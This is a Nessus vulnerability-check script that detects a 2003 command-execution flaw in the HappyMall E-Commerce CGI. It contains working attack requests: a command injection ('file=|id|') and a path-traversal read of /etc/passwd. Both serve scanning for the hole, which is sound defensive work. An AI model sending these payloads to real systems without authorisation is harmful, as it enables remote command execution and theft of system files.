#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref: http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0058.html

if(description)
{
 script_id(11602);
 script_version ("$Revision: 1.3 $");
 script_cve_id("CAN-2003-0243");
 
 name["english"] = "HappyMall Command Execution";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running the HappyMall E-Commerce CGI suite.

There is a flaw in this suite which allows an attacker to execute
arbitrary commands with the privileges of the HTTP daemon (typically
root or nobody), by making a request like :
	/shop/normal_html.cgi?file=|id|


Solution : Upgrade to the newest version of this CGI
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for HappyMall";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if(!port) port = 80;

if(!get_port_state(port))exit(0);


dirs = make_list("","/shop", cgi_dirs());

foreach d (dirs)
{
 req = http_get(item:d+"/normal_html.cgi?file=|id|", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if("uid=" >< res && "gid=" >< res)
 {
	security_hole(port);
	exit(0);
 }
 req = http_get(item:d+"/normal_html.cgi?file=../../../../../../../etc/passwd%00", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:res)){ security_hole(port); exit(0); }
}
